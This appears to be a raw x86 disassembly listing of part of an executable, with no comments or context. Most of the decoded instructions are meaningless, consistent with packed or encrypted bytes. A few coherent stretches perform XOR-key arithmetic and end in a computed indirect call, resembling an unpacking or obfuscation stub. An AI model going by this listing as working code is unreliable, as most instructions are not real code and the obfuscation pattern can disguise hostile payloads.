  40c4ac:	mov    edi,0x17af97eb
  40c4b1:	cmp    BYTE PTR ss:[ecx+0x2eb5e44],ah
  40c4b8:	xor    DWORD PTR [edx+0x33be7409],0xffffffba
  40c4bf:	fdivr  QWORD PTR [ebx-0x21]
  40c4c2:	add    esi,DWORD PTR [ecx-0x75]
  40c4c5:	sbb    edx,DWORD PTR [esp+esi*8]
  40c4c8:	push   ebp
  40c4c9:	mov    dl,0xa0
  40c4cb:	fwait
  40c4cc:	cmc    
  40c4cd:	les    ebp,FWORD PTR [ebx]
  40c4cf:	repnz lods eax,DWORD PTR ds:[esi]
  40c4d1:	sub    al,bh
  40c4d3:	sub    edi,DWORD PTR [ebp+0xdaf8ddd]
  40c4d9:	test   ebp,0x5c114946
  40c4df:	das    
  40c4e0:	icebp  
  40c4e1:	inc    eax
  40c4e2:	dec    ebp
  40c4e3:	inc    ebx
  40c4e4:	fst    DWORD PTR ds:0xe42f619c
  40c4ea:	mov    dl,BYTE PTR [eax-0x6a]
  40c4ed:	popf   
  40c4ee:	cli    
  40c4ef:	inc    ecx
  40c4f0:	dec    ecx
  40c4f1:	jnp    0x40c548
  40c4f3:	and    BYTE PTR [ecx+edx*2],ah
  40c4f6:	leave  
  40c4f7:	sahf   
  40c4f8:	ret    
  40c4f9:	xor    eax,0x8e5e6fb1
  40c4fe:	or     DWORD PTR [esi],ecx
  40c500:	sti    
  40c501:	adc    edx,DWORD PTR [edx+0x75]
  40c504:	xchg   ecx,eax
  40c505:	sub    eax,DWORD PTR [eax-0xbc032a1]
  40c50b:	mov    eax,0xb936a881
  40c510:	mov    bh,0x23
  40c512:	push   cs
  40c513:	adc    BYTE PTR [eax],ch
  40c515:	test   eax,0xeaae3eb5
  40c51a:	outs   dx,BYTE PTR ds:[esi]
  40c51b:	sub    eax,0xeeb61493
  40c520:	int3   
  40c521:	jns    0x40c58d
  40c523:	aad    0xa6
  40c525:	push   0x7e
  40c527:	retf   
  40c528:	in     al,dx
  40c529:	pop    edx
  40c52a:	xchg   esp,eax
  40c52b:	loopne 0x40c53d
  40c52d:	(bad)  
  40c52e:	cwde   
  40c52f:	neg    DWORD PTR [ecx+0x789cd61a]
  40c535:	push   edi
  40c536:	call   0x1061d87f
  40c53b:	sti    
  40c53c:	dec    edx
  40c53d:	xor    al,0x32
  40c53f:	push   ecx
  40c540:	mov    BYTE PTR [ebx],bh
  40c542:	aad    0xb3
  40c544:	push   es
  40c545:	out    dx,al
  40c546:	jg     0x40c52e
  40c548:	(bad)  
  40c549:	fucom  st(4)
  40c54b:	adc    eax,0x18d49d4b
  40c550:	imul   edx,ecx,0x51
  40c553:	jge    0x40c543
  40c555:	sub    BYTE PTR [eax+edi*4-0x15ea81fc],0x17
  40c55d:	push   ebp
  40c55e:	retf   0x95ab
  40c561:	das    
  40c562:	pop    esi
  40c563:	call   0x28616da6
  40c568:	or     DWORD PTR [eax+0x3f],eax
  40c56b:	mov    dh,0x6e
  40c56d:	and    cl,cl
  40c56f:	test   DWORD PTR [edx+0x57315706],edx
  40c575:	fbstp  TBYTE PTR [esi-0x20]
  40c578:	stos   BYTE PTR es:[edi],al
  40c579:	rcl    BYTE PTR [edi],1
  40c57b:	jp     0x40c4fd
  40c57d:	pop    ss
  40c57e:	inc    eax
  40c57f:	les    esi,FWORD PTR [ebx+esi*4-0x5157b248]
  40c586:	aam    0x7a
  40c588:	popf   
  40c589:	mov    ch,0xcd
  40c58b:	mov    al,ds:0xb04f4aef
  40c590:	mov    edx,DWORD PTR [ebx]
  40c592:	xor    DWORD PTR [edi+ebp*1+0x5503ffef],ebp
  40c599:	push   ss
  40c59a:	sbb    BYTE PTR [ebp-0x63af0ba4],bl
  40c5a0:	fld    DWORD PTR [ebx+0x379557d8]
  40c5a6:	mov    eax,0x2f98408
  40c5ab:	popf   
  40c5ac:	(bad)  
  40c5ad:	int3   
  40c5ae:	cmp    DWORD PTR [esi-0x173f66ea],0xffffff99
  40c5b5:	pop    es
  40c5b6:	fcmovbe st,st(7)
  40c5b8:	jnp    0x40c5c8
  40c5ba:	add    ecx,DWORD PTR [ebx+0x12]
  40c5bd:	add    BYTE PTR [edx+eax*1+0x456f2466],0xcd
  40c5c5:	push   ebx
  40c5c6:	(bad)  
  40c5c7:	into   
  40c5c8:	and    BYTE PTR [esp+edx*1-0x1c089367],bh
  40c5cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5d0:	mov    bh,0x8e
  40c5d2:	push   es
  40c5d3:	pop    ebp
  40c5d4:	and    al,0x6b
  40c5d6:	adc    BYTE PTR [esi+0x12b7e1a8],dh
  40c5dc:	daa    
  40c5dd:	iret   
  40c5de:	shr    eax,0x45
  40c5e1:	adc    bh,bh
  40c5e3:	mov    ds:0xa0cc01d8,eax
  40c5e8:	mov    esi,0xcf837c82
  40c5ed:	out    0x27,eax
  40c5ef:	jp     0x40c5d5
  40c5f1:	jae    0x40c5ea
  40c5f3:	add    esi,DWORD PTR [ebx+0x8e46341]
  40c5f9:	xor    BYTE PTR [edx-0x1df3fcf8],dh
  40c5ff:	mov    eax,0x539c0648
  40c604:	push   0xc
  40c606:	jmp    0x40c66b
  40c608:	pop    ecx
  40c609:	shl    esp,0xbe
  40c60c:	test   DWORD PTR [ecx],0x7485f8cf
  40c612:	inc    ebp
  40c613:	ins    BYTE PTR es:[edi],dx
  40c614:	xchg   esi,eax
  40c615:	mov    ah,0x46
  40c617:	dec    esi
  40c618:	rol    BYTE PTR [eax+0x39],0x5a
  40c61c:	repz js 0x40c692
  40c61f:	lahf   
  40c620:	push   ecx
  40c621:	or     edx,DWORD PTR [eax-0x76]
  40c624:	ins    DWORD PTR es:[edi],dx
  40c625:	xor    al,0xf2
  40c627:	cmp    DWORD PTR [edi+0x734b83a9],eax
  40c62d:	xchg   ecx,eax
  40c62e:	mov    eax,0x688f9dd1
  40c633:	fdiv   DWORD PTR [edi-0x22]
  40c636:	(bad)  
  40c638:	mov    esp,0x2454e534
  40c63d:	sbb    eax,0xf43f56d
  40c642:	call   0x23e5:0x87b39c5b
  40c649:	mov    esi,0x46db724b
  40c64e:	(bad)  
  40c64f:	retf   0xee48
  40c652:	mov    ecx,0x389c1169
  40c657:	inc    ecx
  40c658:	dec    ebx
  40c659:	sub    edx,DWORD PTR [eax+0x69]
  40c65c:	sub    al,0x48
  40c65e:	lods   al,BYTE PTR ds:[esi]
  40c65f:	push   esi
  40c660:	and    al,0x1a
  40c662:	out    dx,eax
  40c663:	or     eax,0x7b68c85a
  40c668:	xor    DWORD PTR [ecx],esp
  40c66a:	das    
  40c66b:	mov    bl,0x24
  40c66d:	sbb    edx,DWORD PTR [ebp-0x7451b5af]
  40c673:	pop    eax
  40c674:	arpl   WORD PTR [esi],cx
  40c676:	xor    DWORD PTR [edx],ebp
  40c678:	pop    eax
  40c679:	jle    0x40c6b6
  40c67b:	push   ebp
  40c67c:	push   esi
  40c67d:	or     al,0xbe
  40c67f:	sub    BYTE PTR [edi],bh
  40c681:	xchg   ebx,eax
  40c682:	xchg   ebx,eax
  40c683:	mov    bl,0x49
  40c685:	xor    ch,BYTE PTR [edi+0x1b]
  40c688:	(bad)  
  40c68a:	(bad)
  40c68e:	ins    DWORD PTR es:[edi],dx
  40c68f:	cmp    dl,BYTE PTR [esp+edx*1]
  40c692:	mov    ecx,DWORD PTR [ecx]
  40c694:	adc    BYTE PTR [eax-0x6441585b],dh
  40c69a:	jb     0x40c6ce
  40c69c:	add    BYTE PTR [ebx],al
  40c69e:	(bad)  
  40c69f:	div    edi
  40c6a1:	mov    edx,DWORD PTR [ebp-0x4]
  40c6a4:	xor    edx,ecx
  40c6a6:	lea    eax,[edx+eax*1+0x32729b]
  40c6ad:	mov    edx,DWORD PTR [ebp+0x8]
  40c6b0:	mov    edi,DWORD PTR [ebp-0x24]
  40c6b3:	mov    DWORD PTR [edi+edx*4],eax
  40c6b6:	mov    eax,DWORD PTR [ebp-0x18]
  40c6b9:	mov    edx,DWORD PTR [ebp+0x8]
  40c6bc:	xor    eax,ecx
  40c6be:	lea    eax,[eax+edx*1+0x32729b]
  40c6c5:	mov    DWORD PTR [ebp+0x8],eax
  40c6c8:	mov    eax,DWORD PTR [ebp-0x18]
  40c6cb:	jmp    0x40c92e
  40c6d0:	leave  
  40c6d1:	adc    bl,ah
  40c6d3:	cmp    eax,0x10f1ede3
  40c6d8:	xor    BYTE PTR [ebp+0x1abc9ac1],dl
  40c6de:	and    DWORD PTR [esi+ebx*8-0x80],ebx
  40c6e2:	jle    0x40c762
  40c6e4:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c6e8:	jb     0x40c685
  40c6ea:	jae    0x40c6f9
  40c6ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6ed:	rol    DWORD PTR [ecx],0xc
  40c6f0:	lock ss fwait
  40c6f3:	or     al,0xe9
  40c6f5:	xor    dh,dl
  40c6f7:	pop    es
  40c6f8:	(bad)  
  40c6f9:	mov    al,BYTE PTR [esi+ecx*2]
  40c6fc:	push   0x6c
  40c6fe:	or     ch,bl
  40c700:	inc    ebp
  40c701:	push   ss
  40c702:	lahf   
  40c703:	aas    
  40c704:	xchg   ecx,eax
  40c705:	sahf   
  40c706:	mov    ecx,ebx
  40c708:	rol    BYTE PTR [ebp+0x51],1
  40c70b:	mov    ebp,0x77e2cddd
  40c710:	(bad)  
  40c711:	xor    dh,cl
  40c713:	test   ebx,eax
  40c715:	jae    0x40c75f
  40c717:	cmp    al,0x0
  40c719:	out    0xbe,al
  40c71b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c71c:	or     BYTE PTR [ebx],al
  40c71e:	pop    eax
  40c71f:	or     eax,DWORD PTR [edx-0x48c4f98f]
  40c725:	popf   
  40c726:	or     DWORD PTR [eax],esi
  40c728:	and    cl,ah
  40c72a:	dec    ecx
  40c72b:	mov    cs,ebp
  40c72d:	cld    
  40c72e:	vpinsrw xmm7,xmm0,eax,0xf9
  40c734:	stos   BYTE PTR es:[edi],al
  40c735:	mov    edi,0xebb3dc03
  40c73a:	jno    0x40c76f
  40c73c:	(bad)  
  40c73d:	cmp    eax,edx
  40c73f:	xchg   esi,eax
  40c740:	sub    al,0x34
  40c742:	push   ds
  40c743:	sar    BYTE PTR [edi-0x2b],cl
  40c746:	js     0x40c7a3
  40c748:	push   esp
  40c749:	imul   ecx,esi,0x1661c999
  40c74f:	jnp    0x40c7b9
  40c751:	int3   
  40c752:	sub    al,0x21
  40c754:	repnz cs pop edx
  40c757:	mov    ds:0xc81cd2d8,eax
  40c75c:	rol    BYTE PTR [ecx+edx*8+0x57],cl
  40c760:	outs   dx,DWORD PTR ds:[esi]
  40c761:	int3   
  40c762:	or     BYTE PTR [ebp-0x42],0xa3
  40c766:	mov    DWORD PTR [ebx-0x13b906a4],edx
  40c76c:	out    0xea,eax
  40c76e:	lock sahf 
  40c770:	dec    edx
  40c771:	cli    
  40c772:	pop    esi
  40c773:	cmp    BYTE PTR [edx],dl
  40c775:	out    dx,al
  40c776:	repz xchg edx,eax
  40c778:	lahf   
  40c779:	sbb    BYTE PTR [edi+0x23],dl
  40c77c:	int3   
  40c77d:	inc    eax
  40c77e:	mov    gs,edx
  40c780:	sbb    DWORD PTR [esp+ebp*1-0x7c4bda7c],esp
  40c787:	jbe    0x40c74d
  40c789:	adc    ebx,ecx
  40c78b:	jmp    0xa65:0xf2e1b147
  40c792:	dec    esp
  40c793:	dec    ebp
  40c794:	test   BYTE PTR [edi],bl
  40c796:	fstp   TBYTE PTR [edi-0x6d5bcfe4]
  40c79c:	cli    
  40c79d:	lods   eax,DWORD PTR ds:[esi]
  40c79e:	int3   
  40c79f:	popf   
  40c7a0:	sbb    eax,0xae100af4
  40c7a5:	ss iret 
  40c7a7:	mov    dh,0x99
  40c7a9:	inc    edi
  40c7aa:	cmp    edi,DWORD PTR [edx]
  40c7ac:	jmp    FWORD PTR [ecx]
  40c7ae:	mov    bl,0x20
  40c7b0:	jo     0x40c810
  40c7b2:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40c7b4:	push   0xece19d1a
  40c7b9:	cwde   
  40c7ba:	dec    edi
  40c7bb:	out    0x3e,eax
  40c7bd:	or     dl,BYTE PTR [eax-0x69]
  40c7c0:	jbe    0x40c7b3
  40c7c2:	clc    
  40c7c3:	xor    al,0xfe
  40c7c5:	addr16 iret 
  40c7c7:	(bad)  
  40c7c8:	daa    
  40c7c9:	popa   
  40c7ca:	mov    ah,0xae
  40c7cc:	push   eax
  40c7cd:	sbb    edi,DWORD PTR [edx-0x6be5635d]
  40c7d3:	dec    esi
  40c7d4:	test   eax,0x1a5ef7f0
  40c7d9:	das    
  40c7da:	or     esp,DWORD PTR [eax]
  40c7dc:	in     al,0x8d
  40c7de:	mov    eax,0x610aea92
  40c7e3:	and    BYTE PTR [esi+0x15],0x9e
  40c7e7:	sahf   
  40c7e8:	clc    
  40c7e9:	add    eax,0x32925d47
  40c7ee:	dec    ebx
  40c7ef:	sub    ah,BYTE PTR [edx+0x2b4a1f0d]
  40c7f5:	xchg   eax,edx
  40c7f7:	xchg   edx,eax
  40c7f8:	mov    eax,0x73e207da
  40c7fd:	cmp    ebp,DWORD PTR [esi-0x7b]
  40c800:	cmc    
  40c801:	inc    edx
  40c802:	call   0xceb0:0x9989556a
  40c809:	retf   0x6ede
  40c80c:	mov    cl,0x8
  40c80e:	cwde   
  40c80f:	add    BYTE PTR [ecx-0x62],ch
  40c812:	sbb    DWORD PTR [eax+0x25],esp
  40c815:	scas   eax,DWORD PTR es:[edi]
  40c816:	jge    0x40c84b
  40c818:	in     eax,0x9e
  40c81a:	or     cl,BYTE PTR [ebx]
  40c81c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c81d:	push   ebx
  40c81e:	dec    dl
  40c820:	add    eax,0x447dfad1
  40c825:	popf   
  40c826:	jge    0x40c7cf
  40c828:	mov    DWORD PTR [ebx],esi
  40c82a:	or     eax,0x408ed3b7
  40c82f:	pop    ebp
  40c830:	dec    ebp
  40c831:	push   ebx
  40c832:	daa    
  40c833:	adc    al,0x8e
  40c835:	xlat   BYTE PTR ds:[ebx]
  40c836:	cld    
  40c837:	retf   0xdae8
  40c83a:	pop    esp
  40c83b:	pop    ebx
  40c83c:	ins    BYTE PTR es:[edi],dx
  40c83d:	ins    DWORD PTR es:[edi],dx
  40c83e:	ret    
  40c83f:	call   0x9166:0xd2dcfc1d
  40c846:	aad    0xa9
  40c848:	in     eax,0x5c
  40c84a:	or     al,0xc4
  40c84c:	add    dl,BYTE PTR [esi+0x4d]
  40c84f:	loope  0x40c7db
  40c851:	push   ds
  40c852:	sbb    eax,0x3e26cdcf
  40c857:	out    0xe,eax
  40c859:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c85a:	xchg   esp,eax
  40c85b:	push   esi
  40c85c:	and    BYTE PTR [edi+0x4d],0x44
  40c860:	sbb    BYTE PTR [ecx-0x5b4c5e46],al
  40c866:	fldenv [ecx]
  40c868:	test   BYTE PTR [edi-0x69],dl
  40c86b:	sub    ah,bh
  40c86d:	(bad)  
  40c86e:	add    esi,DWORD PTR [edi+0x22f8c46b]
  40c874:	mov    al,0x2d
  40c876:	data16 cmp ch,BYTE PTR [ebx]
  40c879:	mov    dl,0x89
  40c87b:	pop    edx
  40c87c:	aas    
  40c87d:	sbb    ecx,DWORD PTR [edx+0x4e]
  40c880:	or     esp,eax
  40c882:	sbb    ebx,DWORD PTR [ecx+0x61]
  40c885:	stos   BYTE PTR es:[edi],al
  40c886:	and    BYTE PTR [ebp-0x3799352f],al
  40c88c:	mov    cl,0x8f
  40c88e:	lock dec esp
  40c890:	jnp    0x40c888
  40c892:	je     0x40c8b6
  40c894:	jge    0x40c8c3
  40c896:	fisub  WORD PTR [edx+0x3c5f956d]
  40c89c:	push   esp
  40c89d:	addr16 cmp eax,0x802e959f
  40c8a3:	and    esi,DWORD PTR [edx]
  40c8a5:	ret    0x5059
  40c8a8:	cmp    ebp,DWORD PTR [ecx]
  40c8aa:	fidivr DWORD PTR [edx+0x22]
  40c8ad:	xchg   ebp,eax
  40c8ae:	xchg   edi,eax
  40c8af:	jge    0x40c895
  40c8b1:	jecxz  0x40c86a
  40c8b3:	mov    ds:0xe1ee6b93,eax
  40c8b8:	stos   DWORD PTR es:[edi],eax
  40c8b9:	loope  0x40c899
  40c8bb:	mov    ch,0xbc
  40c8bd:	adc    BYTE PTR [edi+edi*1+0x7f85a6c6],0xee
  40c8c5:	mov    cl,0x35
  40c8c7:	stc    
  40c8c8:	imul   edx,esi,0x87f95f2a
  40c8ce:	rcl    BYTE PTR [esi+ecx*1],cl
  40c8d1:	or     eax,0xbad433c4
  40c8d6:	les    ebp,FWORD PTR [ebp+0x26]
  40c8d9:	iret   
  40c8da:	cwde   
  40c8db:	aam    0xa1
  40c8dd:	push   ds
  40c8de:	cs and al,0x91
  40c8e1:	repnz sahf 
  40c8e3:	sbb    ebp,0xffffffc2
  40c8e6:	mov    dx,0x9d8e
  40c8ea:	jecxz  0x40c93a
  40c8ec:	mov    cl,0xd1
  40c8ee:	inc    eax
  40c8ef:	leave  
  40c8f0:	mov    ds:0x47263d4f,al
  40c8f5:	das    
  40c8f6:	inc    ebp
  40c8f7:	ins    DWORD PTR es:[edi],dx
  40c8f8:	jbe    0x40c89c
  40c8fa:	loopne 0x40c923
  40c8fc:	cwde   
  40c8fd:	test   DWORD PTR [esi],0x7aecf12f
  40c903:	mov    eax,ds:0xdbdc1f61
  40c908:	aad    0x77
  40c90a:	frstor [edx+ecx*1-0x7a]
  40c90e:	mov    bl,0x36
  40c910:	inc    ecx
  40c911:	mov    ebp,0xfe59422f
  40c916:	pop    ss
  40c917:	or     al,0x92
  40c919:	les    esi,FWORD PTR [esi]
  40c91b:	je     0x40c94a
  40c91d:	push   ebx
  40c91e:	clc    
  40c91f:	xor    edi,DWORD PTR [ebp+0xc]
  40c922:	xchg   edi,eax
  40c923:	xor    BYTE PTR fs:[edi+ebp*1-0x4f],bl
  40c928:	les    ebp,FWORD PTR [edi]
  40c92a:	leave  
  40c92b:	mov    BYTE PTR [eax+0x42],dl
  40c92e:	mov    edx,DWORD PTR [ebp+0x14]
  40c931:	xor    eax,ecx
  40c933:	jmp    0x40cb96
  40c938:	pop    es
  40c939:	mov    ah,0x6
  40c93b:	cwde   
  40c93c:	mov    ch,0xa8
  40c93e:	mov    eax,ds:0x31ca67b1
  40c943:	cmp    ebx,esi
  40c945:	or     BYTE PTR [edi+0x7e8e9876],al
  40c94b:	jle    0x40c985
  40c94d:	jl     0x40c9cd
  40c94f:	jle    0x40c8d1
  40c951:	hlt    
  40c952:	inc    eax
  40c953:	sbb    al,ah
  40c955:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c956:	pushf  
  40c957:	push   0x30
  40c959:	xchg   ecx,eax
  40c95a:	pop    eax
  40c95b:	fsub   DWORD PTR [ecx-0x50]
  40c95e:	push   0xffffff95
  40c960:	add    ecx,esi
  40c962:	inc    esp
  40c963:	cs fdivrp st(3),st
  40c966:	jmp    0x40c926
  40c968:	fsincos 
  40c96a:	dec    ebx
  40c96b:	popa   
  40c96c:	or     al,0xee
  40c96e:	lock pushw 0x75fa
  40c973:	or     BYTE PTR [eax+0x20a77f],ah
  40c979:	and    ecx,DWORD PTR [ebx+0x28]
  40c97c:	push   edx
  40c97d:	lods   al,BYTE PTR ds:[esi]
  40c97e:	pop    esp
  40c97f:	in     eax,dx
  40c980:	xor    ecx,DWORD PTR [edx]
  40c982:	pop    esi
  40c983:	mov    ah,0x66
  40c985:	push   0x317aea1b
  40c98a:	mov    bl,0xf9
  40c98c:	jp     0x40c9b1
  40c98e:	rcr    BYTE PTR [di],0x7
  40c992:	mov    eax,ds:0xdf12e952
  40c997:	js     0x40c9b6
  40c999:	cld    
  40c99a:	mov    edx,DWORD PTR [edx+ecx*2]
  40c99d:	retf   0x5d8a
  40c9a0:	dec    esp
  40c9a1:	push   cs
  40c9a2:	cmp    dl,BYTE PTR [ebx]
  40c9a4:	xor    eax,0xf95e099e
  40c9a9:	mov    ds:0xb8f8c1ae,al
  40c9ae:	inc    edx
  40c9af:	sbb    eax,0xd342c52f
  40c9b4:	out    0xbc,eax
  40c9b6:	ret    
  40c9b7:	rcl    ebx,0xe9
  40c9ba:	call   0x1585e1b3
  40c9bf:	test   al,0x9c
  40c9c1:	sbb    BYTE PTR [edi],ch
  40c9c3:	inc    eax
  40c9c4:	std    
  40c9c5:	xor    al,BYTE PTR ds:0x31054134
  40c9cb:	fs sbb al,0x3d
  40c9ce:	dec    eax
  40c9cf:	sti    
  40c9d0:	scas   eax,DWORD PTR es:[edi]
  40c9d1:	pop    ss
  40c9d2:	retf   
  40c9d3:	adc    bh,bl
  40c9d5:	out    0x7c,al
  40c9d7:	mov    edi,ecx
  40c9d9:	pop    ecx
  40c9da:	enter  0xb8f6,0x56
  40c9de:	jmp    0x40c9a3
  40c9e0:	out    0xe0,eax
  40c9e2:	pop    es
  40c9e3:	mov    dh,BYTE PTR [eax-0x73bebbd6]
  40c9e9:	ins    BYTE PTR es:[edi],dx
  40c9ea:	dec    ecx
  40c9eb:	jge    0xeda8e429
  40c9f1:	xchg   edx,eax
  40c9f2:	fiadd  WORD PTR [ebp-0x554d640c]
  40c9f8:	xor    BYTE PTR [eax-0x4c949a5b],0x25
  40c9ff:	test   cl,cl
  40ca01:	jbe    0x40ca1d
  40ca03:	iret   
  40ca04:	xor    BYTE PTR [ecx+0x1c],dh
  40ca07:	or     edx,DWORD PTR [esi]
  40ca09:	outs   dx,BYTE PTR ds:[esi]
  40ca0a:	and    eax,0xb836c3f9
  40ca0f:	mov    ds:0x89f79e36,al
  40ca14:	mov    esi,0xa6e859be
  40ca1a:	sbb    BYTE PTR [edi],ah
  40ca1c:	push   edx
  40ca1d:	fsubr  DWORD PTR [edx]
  40ca1f:	mov    ah,0x40
  40ca21:	mov    ebp,0xc58a0e5d
  40ca26:	or     DWORD PTR [edi],0x577a5fb5
  40ca2c:	dec    ebp
  40ca2d:	sbb    eax,0x5f97e4ac
  40ca32:	rcr    BYTE PTR [edi],0x9b
  40ca35:	pop    ds
  40ca36:	imul   ebx,DWORD PTR [edi],0x4a61da39
  40ca3c:	dec    esi
  40ca3d:	dec    ebx
  40ca3e:	ffreep st(0)
  40ca40:	sub    al,dh
  40ca42:	(bad)  
  40ca44:	dec    edx
  40ca45:	add    al,BYTE PTR [esi-0x66]
  40ca48:	js     0x40c9e6
  40ca4a:	add    ecx,DWORD PTR [ebx-0x43]
  40ca4d:	add    DWORD PTR [edi],edx
  40ca4f:	rcl    BYTE PTR [edi+0x6d42f5ce],cl
  40ca55:	call   0x1213:0x97a22a64
  40ca5c:	push   0xffffffed
  40ca5e:	add    cl,BYTE PTR [edi-0x5f1590a9]
  40ca64:	fst    DWORD PTR [esi+0x5a]
  40ca67:	and    eax,0xc06c9ae
  40ca6c:	pop    es
  40ca6d:	sbb    al,0x1e
  40ca6f:	mov    eax,0x3a01ac8a
  40ca74:	xor    al,0xc
  40ca76:	lods   al,BYTE PTR ds:[esi]
  40ca77:	pushf  
  40ca78:	sub    BYTE PTR [edi+0x48c356bf],al
  40ca7e:	pushf  
  40ca7f:	jno    0x40ca10
  40ca81:	cli    
  40ca82:	sbb    DWORD PTR [ecx-0x192a448d],edx
  40ca88:	cmc    
  40ca89:	rcl    al,0xc5
  40ca8c:	sub    al,BYTE PTR [ecx+0x2879f87f]
  40ca92:	push   es
  40ca93:	dec    ebp
  40ca94:	std    
  40ca95:	mov    edx,0x5f000664
  40ca9a:	mov    cl,0x42
  40ca9c:	or     BYTE PTR [esp+ecx*1+0x247bb2f2],ah
  40caa3:	lock cmp DWORD PTR [edx-0x1f],eax
  40caa7:	ins    DWORD PTR es:[edi],dx
  40caa8:	scas   al,BYTE PTR es:[edi]
  40caa9:	lods   al,BYTE PTR ds:[esi]
  40caaa:	jp     0x40ca9c
  40caac:	fnstenv [ebp-0x59]
  40caaf:	cmc    
  40cab0:	jp     0x40ca6a
  40cab2:	js     0x40caf7
  40cab4:	cmp    eax,0x51e5980f
  40cab9:	fwait
  40caba:	push   ebp
  40cabb:	fs cmp eax,0x219ee76e
  40cac1:	xor    al,0xed
  40cac3:	bound  ebp,QWORD PTR [esp+eiz*8+0x6b63d7be]
  40caca:	cmp    DWORD PTR [eax-0x4a],edx
  40cacd:	test   DWORD PTR [ebp-0x67],esi
  40cad0:	sub    esp,esi
  40cad2:	imul   edi,DWORD PTR [esi+0x54],0xffffff97
  40cad6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cad7:	ins    BYTE PTR es:[edi],dx
  40cad8:	pusha  
  40cad9:	xchg   esp,eax
  40cada:	lods   al,BYTE PTR ds:[esi]
  40cadb:	mov    ecx,DWORD PTR [esi]
  40cadd:	mov    bh,0x71
  40cadf:	sbb    eax,esi
  40cae1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cae2:	jns    0x40cb00
  40cae4:	ds dec edi
  40cae6:	jmp    0x40ca79
  40cae8:	jne    0x40cb49
  40caea:	mov    cl,0x2e
  40caec:	mov    edi,0x6b1885de
  40caf1:	add    esp,esp
  40caf3:	xlat   BYTE PTR ds:[ebx]
  40caf4:	(bad)  
  40caf5:	in     eax,0xf9
  40caf7:	(bad)  
  40caf8:	cli    
  40caf9:	loopne 0x40cad9
  40cafb:	adc    eax,0xfc6fa753
  40cb00:	dec    esi
  40cb01:	int3   
  40cb02:	fisttp WORD PTR [esi-0x9]
  40cb05:	sbb    DWORD PTR [ebx-0x4e46800a],edi
  40cb0b:	adc    BYTE PTR [edx],dh
  40cb0d:	and    al,0xf0
  40cb0f:	mov    ebx,0x727c8477
  40cb14:	out    dx,al
  40cb15:	cmc    
  40cb16:	jp     0x40cab8
  40cb18:	adc    ebp,DWORD PTR [esi]
  40cb1a:	add    DWORD PTR [eax],edi
  40cb1c:	adc    ecx,DWORD PTR [ecx]
  40cb1e:	jo     0x40cb45
  40cb20:	xchg   dl,bh
  40cb22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb23:	dec    ecx
  40cb24:	pop    ecx
  40cb25:	push   es
  40cb26:	aas    
  40cb27:	xor    ebp,eax
  40cb29:	lock cmp esp,DWORD PTR [ecx]
  40cb2c:	loopne 0x40cb57
  40cb2e:	int    0xee
  40cb30:	jle    0x40cad5
  40cb32:	dec    edi
  40cb33:	and    al,0xf0
  40cb35:	add    cl,bh
  40cb37:	xor    edx,esi
  40cb39:	cmp    BYTE PTR [edx+0x78],dl
  40cb3c:	jno    0x40cb5a
  40cb3e:	sub    BYTE PTR [ebx],0xf7
  40cb41:	push   cs
  40cb42:	jmp    0x7e97:0xffa6d1c2
  40cb49:	stos   DWORD PTR es:[edi],eax
  40cb4a:	and    BYTE PTR [eax],bl
  40cb4c:	call   0xe5d9aa5e
  40cb51:	ficomp WORD PTR [esi-0x5]
  40cb54:	xor    ebx,DWORD PTR [ecx]
  40cb56:	dec    eax
  40cb57:	rcl    DWORD PTR [edi-0x27ac14bb],1
  40cb5d:	sahf   
  40cb5e:	in     eax,dx
  40cb5f:	dec    edi
  40cb60:	push   esp
  40cb61:	xchg   esi,eax
  40cb62:	push   0x56e4bf6c
  40cb67:	pop    ebp
  40cb68:	mov    DWORD PTR [esi-0x9],ebx
  40cb6b:	repnz (bad) 
  40cb6d:	ds ja  0x40caf5
  40cb70:	adc    al,0x5c
  40cb72:	dec    edx
  40cb73:	jb     0x40cb77
  40cb75:	inc    edi
  40cb76:	stc    
  40cb77:	mov    edi,gs
  40cb79:	mov    dl,0xcb
  40cb7b:	sub    bh,BYTE PTR [esi-0x4c033ffb]
  40cb81:	push   0xcbcf7e6f
  40cb86:	out    0x6d,al
  40cb88:	(bad)  
  40cb89:	and    eax,eax
  40cb8b:	or     BYTE PTR [eax+0x7e],bl
  40cb8e:	pop    ds
  40cb8f:	jl     0x40cb44
  40cb91:	sub    al,0xb9
  40cb93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb94:	retf   0x3bd
  40cb97:	(bad)  
  40cb98:	imul   eax,DWORD PTR [edx]
  40cb9b:	mov    edx,DWORD PTR [ebp-0x4]
  40cb9e:	xor    edx,ecx
  40cba0:	mov    ecx,DWORD PTR [ebp+0x8]
  40cba3:	lea    ecx,[edx+ecx*1+0x32729b]
  40cbaa:	cmp    ecx,eax
  40cbac:	jne    0x40c41f
  40cbb2:	mov    ebx,esi
  40cbb4:	jmp    0x40cbbe
  40cbb9:	mov    ebx,0x32729b
  40cbbe:	mov    eax,DWORD PTR [ebp-0x4]
  40cbc1:	xor    eax,0x7510854
  40cbc6:	add    eax,ebx
  40cbc8:	mov    DWORD PTR [ebp-0xc],eax
  40cbcb:	xor    ebx,ebx
  40cbcd:	lea    eax,[ebp-0x10]
  40cbd0:	add    ebx,DWORD PTR [eax]
  40cbd2:	call   ebx
  40cbd4:	xor    ebx,ebx
  40cbd6:	inc    ebx
  40cbd7:	cmp    DWORD PTR [ebp+0x10],ebx
  40cbda:	je     0x40d321
  40cbe0:	xchg   edx,eax
  40cbe1:	push   0xa
  40cbe3:	pop    ecx
  40cbe4:	push   0x4
  40cbe6:	pop    ebx
  40cbe7:	inc    ebx
  40cbe8:	xchg   ebx,ecx
  40cbea:	jmp    0x40ce4d
  40cbef:	imul   edx,DWORD PTR [edi-0x4b0ecbf3],0x73
  40cbf6:	push   ecx
  40cbf7:	int3   
  40cbf8:	xor    esp,DWORD PTR [esi+edi*8+0x5d]
  40cbfc:	push   esp
  40cbfd:	mov    dh,0xcd
